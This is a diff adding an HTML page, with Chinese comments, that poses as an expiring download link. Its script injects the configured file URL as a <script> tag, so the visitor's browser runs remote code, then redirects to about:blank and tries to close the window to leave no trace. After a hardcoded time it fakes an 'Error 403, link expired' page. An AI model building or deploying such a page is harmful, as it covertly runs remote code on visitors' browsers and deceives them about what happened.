@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title></title>
+<style>
+  html, body { margin: 0; padding: 0; background: #fff; }
+
+  /* 仅过期时才用到的 403 排版 */
+  .err-wrap {
+    position: fixed; inset: 0;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: space-between;
+    padding: 12vh 24px 10vh;
+    box-sizing: border-box;
+    font-family: -apple-system, "Segoe UI", "Microsoft YaHei", sans-serif;
+    background: #fff;
+  }
+  .err-title {
+    font-size: clamp(56px, 14vw, 140px);
+    font-weight: 800;
+    letter-spacing: -2px;
+    line-height: 1;
+    color: #1a1a1a;
+    margin: 0;
+    text-align: center;
+  }
+  .err-hint {
+    font-size: 14px;
+    line-height: 1.7;
+    color: #9a9a9a;
+    text-align: center;
+    margin: 0;
+  }
+</style>
+</head>
+<body>
+<script>
+(function () {
+  /* ============ 配置区 ============ */
+  var FILE_URL   = 'https://example.com/your-file.zip'; // ← 改成你的文件地址
+
+  // ★ 失效时刻（固定时间戳，写死在页面里）
+  // 改成「部署这一刻 + 25 小时」，示例：2026-10-25T12:00:00+08:00
+  var EXPIRE_AT  = Date.parse('2026-10-25T12:00:00+08:00'); // ← 改成你的截止时间
+
+  var JUMP_DELAY = 1200; // 下载触发后多久跳转（毫秒）
+  var MAX_WAIT   = 4000; // 兜底：最多等这么久就跳转
+  /* ================================ */
+
+  /* ---------- 过期：英文 403 页面，终止后续动作 ---------- */
+  function deny() {
+    try { window.stop(); } catch (e) {}
+
+    document.title = 'Error 403';
+    document.body.innerHTML = '';
+
+    var wrap = document.createElement('div');
+    wrap.className = 'err-wrap';
+
+    var title = document.createElement('h1');
+    title.className = 'err-title';
+    title.textContent = 'Error 403';
+
+    var hint = document.createElement('p');
+    hint.className = 'err-hint';
+    hint.textContent = 'This download link has expired. Please request a new one.';
+
+    wrap.appendChild(title);
+    wrap.appendChild(hint);
+    document.body.appendChild(wrap);
+  }
+
+  /* ---------- 过期判断：纯本地时间 ---------- */
+  function isExpired() {
+    return !isFinite(EXPIRE_AT) || Date.now() >= EXPIRE_AT;
+  }
+
+  if (isExpired()) { deny(); return; }
+
+  /* ---------- 下载 + 无痕跳转 ---------- */
+  var jumped = false;
+  function leave() {
+    if (jumped) return;
+    jumped = true;
+    try { location.replace('about:blank'); } catch (e) { location.href = 'about:blank'; }
+    setTimeout(function () { try { window.close(); } catch (e) {} }, 60);
+  }
+
+  var s = document.createElement('script');
+  s.src = FILE_URL;
+  s.async = true;
+  s.onload  = function () { setTimeout(leave, JUMP_DELAY); };
+  s.onerror = function () { setTimeout(leave, JUMP_DELAY); };
+  (document.head || document.documentElement).appendChild(s);
+
+  // 兜底：事件没触发也照样跳转
+  setTimeout(leave, MAX_WAIT);
+})();
+</script>
+</body>
+</html>
